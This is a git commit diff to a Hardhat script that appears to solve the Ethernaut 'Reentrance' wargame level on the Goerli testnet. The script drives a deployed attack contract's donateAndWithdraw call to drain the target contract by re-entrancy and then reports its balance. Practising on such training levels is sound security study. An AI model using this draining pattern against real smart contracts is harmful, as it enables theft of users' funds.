2c80a00d5e45c3555bcb40f28c0427fe8030e72d
Crys <mariano.christopher123@gmail.com>
2022-12-16 16:11:45 +0800

    updated reentrance level

--- scripts/attackReentrance.ts
+++ scripts/attackReentrance.ts
@@ -3,45 +3,16 @@ import { ethers } from "hardhat";
 const attackReentrance = async () => {
     // change contract addresses here.
     const reentranceAddress = "0xEfC594B6E8100d412aadc34D4E6ACBbD6CC0E85a"; //type "await contract.address()" in ethernaut console
+    // AttackReentrance address = "0x44d67b486C68c1273871a5De10DD3fe2E8df4714";
 
     // Don't touch below 🚀
-    // Vulnerability comes from the possibility of making a malicious contract the king
-    // Additional read to understand more on recieve and transfer to make the contract needed:
+    // The contract is vulnerable to re-entrancy
+    // Additional read about re-entrancy, call and receive
+    // https://consensys.github.io/smart-contract-best-practices/known_attacks/
     // https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995
-    // https://docs.soliditylang.org/en/v0.8.10/types.html#members-of-addresses
+    // https://docs.soliditylang.org/en/v0.6.0/types.html#address
     // typing all commands in console below
-    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
-    const ABI = [
-        {
-            constant: true,
-            inputs: [],
-            name: "_king",
-            outputs: [{ internalType: "address", name: "", type: "address" }],
-            payable: undefined,
-            stateMutability: "view",
-            type: "function",
-        },
-        {
-            constant: true,
-            inputs: [],
-            name: "prize",
-            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
-            payable: undefined,
-            stateMutability: "view",
-            type: "function",
-        },
-        {
-            constant: undefined,
-            inputs: [],
-            name: "owner",
-            outputs: [{ internalType: "address", name: "", type: "address" }],
-            payable: undefined,
-            stateMutability: "nonpayable",
-            type: "function",
-        },
-    ];
     const attack = await ethers.getContract("AttackReentrance");
-    const contract = await ethers.getContractAt(ABI, reentranceAddress);
     // const provider = ethers.getDefaultProvider("goerli");    // alternate defualt provider
     const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
     const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
@@ -49,7 +20,7 @@ const attackReentrance = async () => {
     let contractBalance = ethers.utils.formatEther(await provider.getBalance(reentranceAddress));
     console.log(`Balance of Reentrance Contract is: ${contractBalance} ETH`);
     const tx = await attack.donateAndWithdraw({ value: ethers.utils.parseEther("0.001") });
-    const txReceipt = tx.wait(2);
+    const txReceipt = await tx.wait(2);
     console.log(txReceipt);
     console.log("Checking again Reentrance Contract balance...");
     contractBalance = ethers.utils.formatEther(await provider.getBalance(reentranceAddress));
@@ -63,7 +34,7 @@ const attackReentrance = async () => {
         console.log("Done, Submit to ethernaut.");
     } else {
         console.log("Waiting for a minute...");
-        setTimeout(async () => {
+        const run = setTimeout(async () => {
             contractBalance = ethers.utils.formatEther(
                 await provider.getBalance(reentranceAddress)
             );
